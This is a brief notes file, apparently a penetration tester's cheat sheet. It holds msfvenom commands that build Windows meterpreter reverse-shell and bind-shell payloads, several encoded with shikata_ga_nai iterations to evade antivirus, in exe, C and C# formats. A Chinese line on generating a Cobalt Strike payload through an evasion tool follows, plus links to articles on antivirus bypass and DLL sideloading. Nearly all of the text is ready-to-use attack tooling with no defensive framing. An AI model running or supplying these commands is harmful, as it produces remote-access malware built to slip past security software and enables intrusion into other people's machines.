msf 

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.161 LPORT=1234 -e x64/shikata_ga_nai -i 5 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -i 15  -f c -o payload_bind.txt
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -i 15  -f csharp -o payload_bind.txt
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -f c > payload.c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.134 LPORT=1234 -f c > payload.c
```

cobalt strike
生成 payload C 版本。用掩日生成一下。

# Article
- rw_bypass_免杀_BypassAV.html
- [有手就行的白加黑实战免杀 - FreeBuf 网络安全行业门户](https://www.freebuf.com/articles/system/333690.htm)
